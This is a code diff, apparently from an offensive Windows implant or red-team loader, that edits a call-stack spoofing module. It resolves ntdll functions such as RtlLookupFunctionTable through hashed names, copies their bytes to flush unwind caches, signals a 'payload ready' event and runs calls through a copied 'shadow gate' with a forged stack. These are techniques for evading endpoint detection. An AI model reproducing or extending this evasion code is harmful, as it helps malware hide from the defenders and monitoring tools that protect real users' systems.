@@ -17,7 +17,7 @@ BOOL StackSpoof::FlushFunctionTableCache(
     OUT PDWORD pdwOld
 ) {
     PVOID                   Ntdll           = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
-    ULONG_PTR               FnAddress       = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionTable"));
+    ULONG_PTR               FnAddress       = (ULONG_PTR)Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionTable"));
 
     BYTE Buffer[128] = { 0 };
     Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));
@@ -66,7 +66,7 @@ BOOL StackSpoof::FlushFunctionEntryCache(
     OUT PDWORD pdwOld
 ) {
     PVOID                   Ntdll = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll"));
-    ULONG_PTR               FnAddress = (ULONG_PTR)Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));
+    ULONG_PTR               FnAddress = (ULONG_PTR)Resolver::LdrShieldedSymbolResolveByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));
 
     BYTE Buffer[128] = { 0 };
     Primitive::MemoryCopy(Buffer, (PVOID)FnAddress, sizeof(Buffer));
@@ -427,6 +427,9 @@ ULONG_PTR StackSpoof::ExecuteWithSpoofedStack(
 
     typedef ULONG_PTR(*fnShadowGate)(PSHADOWGATE_PARAMS);
     fnShadowGate pCopiedGate = (fnShadowGate)((ULONG_PTR)pModule + dwGateRva);
+
+    if (g_PayloadReady)
+        g_Win32.Nt.NtSetEvent(g_PayloadReady, nullptr);
 
     ULONG_PTR Result = pCopiedGate(pParams);
 
